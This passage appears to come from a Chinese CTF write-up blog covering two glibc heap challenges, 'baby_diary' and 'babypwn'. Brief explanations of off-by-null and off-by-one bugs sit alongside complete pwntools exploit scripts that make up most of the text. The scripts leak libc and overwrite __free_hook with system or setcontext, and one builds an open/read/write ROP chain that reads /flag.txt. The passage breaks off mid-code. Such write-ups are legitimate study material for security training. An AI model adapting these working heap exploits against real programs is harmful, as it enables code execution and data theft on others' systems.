title="baby_diary"></a>baby_diary</h2><p>典型的高版本all-off-null,不同的是在我们在对面chunk写入信息后,会根据我们的写入,计算一个半字节并放入我们输入信息后.当我们出入全是’\x00’,那个半字节就是’\x0’,若不是’\x00则是非’\x0’的办字节.因此我们在输入时,至少影响一个半的字节.因此我们只能通过爆破法来求解.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"><span class="comment">#sh=process('./baby_diary')</span></span><br><span class="line"><span class="comment">#sh=remote('8.140.114.72', 1399)</span></span><br><span class="line">elf=ELF(<span class="string">'./baby_diary'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('./libc-2.31.so')</span></span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content=<span class="string">'/bin/sh\x00'</span>)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x4ba0</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x600</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#9</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#10 x</span></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#11 x</span></span><br><span class="line">    add(<span class="number">0x47</span>)<span class="comment">#12 x</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#0</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">'l chunk'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,p8(<span class="number">0</span>))<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">'l chunk'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#4,5,6,10, 11,13,14</span></span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0</span>)+p8(<span class="number">0x10</span>)) <span class="comment">#15  x</span></span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'5555555'</span>)<span class="comment">#16 x</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0x190</span>)+p64(<span class="number">0x101</span>)+p8(<span class="number">0x40</span>))<span class="comment">#</span></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0</span>)*<span class="number">6</span>+p8(<span class="number">0</span>)*<span class="number">6</span>)<span class="comment">#16</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,p8(<span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">0x37</span>,p8(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x47</span>,p64(<span class="number">0</span>)*<span class="number">8</span>+p8(<span class="number">0</span>)*<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x47</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#17+23</span></span><br><span class="line">        add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">19</span>)</span><br><span class="line">    free(<span class="number">20</span>)</span><br><span class="line">    free(<span class="number">21</span>)</span><br><span class="line">    free(<span class="number">22</span>)</span><br><span class="line">    free(<span class="number">23</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x1000</span>)<span class="comment">#0</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    add(<span class="number">0x57</span>,<span class="string">'1'</span>*<span class="number">7</span>)<span class="comment">#17</span></span><br><span class="line"><span class="comment">#    free(14)</span></span><br><span class="line"><span class="comment">#    add(0x37,p64(1)+p8(0)*8)</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>)                     </span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">3</span>)    </span><br><span class="line">    show(<span class="number">17</span>)</span><br><span class="line">    addr=u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-391</span></span><br><span class="line">    log.info(<span class="string">'main_arena:'</span>+hex(addr))</span><br><span class="line">    malloc=addr<span class="number">-0x10</span></span><br><span class="line">    log.info(<span class="string">'malloc_hook:'</span>+hex(malloc))</span><br><span class="line">    x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc+<span class="number">10</span>,num=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">multi libc results:</span></span><br><span class="line"><span class="string">[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)</span></span><br><span class="line"><span class="string">[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)</span></span><br><span class="line"><span class="string">[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[!] you can choose it by hand</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    add(<span class="number">0x57</span>,<span class="string">'22222'</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p64(x.dump(<span class="string">'__free_hook'</span>)))<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x57</span>)<span class="comment">#17</span></span><br><span class="line">    add(<span class="number">0x57</span>,p64(x.dump(<span class="string">'system'</span>))) <span class="comment">#18</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sh=process(<span class="string">"./baby_diary"</span>)</span><br><span class="line">        <span class="comment">#sh=remote('8.140.114.72', 1399)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn2()</span><br><span class="line">            gdb.attach(sh)</span><br><span class="line">            sh.interactive()</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            print(repr(e))</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./babypwn'</span>)</span><br><span class="line">p=process(<span class="string">'./babypwn'</span>)</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text=<span class="string">''</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(str(text))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(v2)</span>:</span></span><br><span class="line">    s=Solver()</span><br><span class="line">    a1=BitVec(<span class="string">'a1'</span>,<span class="number">32</span>) </span><br><span class="line">    t = a1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            a1 ^= (<span class="number">32</span> * a1) ^ (LShR((a1 ^ (<span class="number">32</span> * a1)), <span class="number">17</span>)) ^ (((<span class="number">32</span> * a1) ^ a1 ^ (LShR((a1 ^ (<span class="number">32</span> * a1)), <span class="number">17</span>))) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">    s.add(a1 == int(v2,<span class="number">16</span>))</span><br><span class="line">    s.check()</span><br><span class="line">    ans = int(s.model()[t].as_long())</span><br><span class="line">    print(hex(ans))</span><br><span class="line">    <span class="keyword">return</span> p32(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x88</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0xf0</span>*<span class="string">'1'</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x11</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x88</span>*<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">p.recv()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">x=p.recvline()</span><br><span class="line">y=p.recvline()</span><br><span class="line">x=decode(x)</span><br><span class="line">y=x+decode(y)</span><br><span class="line">addr=u64(y)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">main_arena=addr<span class="number">-328</span></span><br><span class="line">malloc=main_arena<span class="number">-0x10</span></span><br><span class="line">log,info(<span class="string">'malloc:'</span>+hex(malloc))</span><br><span class="line">x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc,num=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'yyyyyyy'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">rdi_ret=x.libcbase+<span class="number">0x0000000000025a3b</span></span><br><span class="line">rsi_ret=x.libcbase+<span class="number">0x00000000000263e9</span></span><br><span class="line">rdx_ret=x.libcbase+<span class="number">0x00000000001018c5</span></span><br><span class="line">rbp_ret=x.libcbase+<span class="number">0x000000000004a1a7</span></span><br><span class="line">rax=x.libcbase+<span class="number">0x000000000002606c</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">xx=p.recvline()</span><br><span class="line">y=p.recvline()</span><br><span class="line">xx=decode(xx)</span><br><span class="line">y=xx+decode(y)</span><br><span class="line">addr=u64(y)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">edit(<span class="number">13</span>,p64(x.dump(<span class="string">'setcontext'</span>)+<span class="number">53</span>))</span><br><span class="line">pay=p64(rdi_ret)+p64(<span class="number">0</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'read'</span>))</span><br><span class="line">pay+=p64(rdi_ret)+p64(addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(rdx_ret)+p64(<span class="number">0</span>)+p64(x.dump(<span class="string">'open'</span>))<span class="comment">#open(addr,0,0)</span></span><br><span class="line">pay+=p64(rdi_ret)+p64(<span class="number">3</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'read'</span>))</span><br><span class="line">pay+=p64(rdi_ret)+p64(<span class="number">1</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'write'</span>))</span><br><span class="line">print(len(pay))</span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">15</span>,pay)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'1'</span>*<span class="number">0x10</span>+p64(addr+<span class="number">0x118</span>+<span class="number">0x360</span>)+p64(rdi_ret)+<span class="string">'1'</span>*<span class="number">0x18</span>+<span class="string">'3'</span>*<span class="number">0x40</span>+<span class="string">'22222'</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/flag.txt\x00'</span>)</span><br><span class="line"><span class="comment">#free(10)</span></span><br><span class="line"><span class="comment">#edit(10,'xxxxxxx')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>heap题orw 第一次做，在正式比赛时踩了很多坑。赛后才复现出来</p><p>典型的all by one ，缩小free chunk 用法。但在正式比赛时，直接给自己玩坑chunk 在布局时给小了,导致后面orw 写不下，orz….好在通过z3来爆破出show函数的输出值,可以推算出chunk间的关系。不过，在复现时也学到一个知识：就算我们通过hook控制的只能是程序的rip。不能直接控制rbp和rsp。但我们可以通过SROP方法，利用setcontext来间接控制rbp和rsp。（这里有个坑，布置X64的sigcontext至少需0xf8的空间）同时c语言在执行一些函数时，传入参数格式正确但值不符合逻辑的如read(0,0,0)这种，利用chunk内原本的‘\x00’这样可以适当减少自己写入sigcontext 长度，只需要专注控制rbp和rsp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 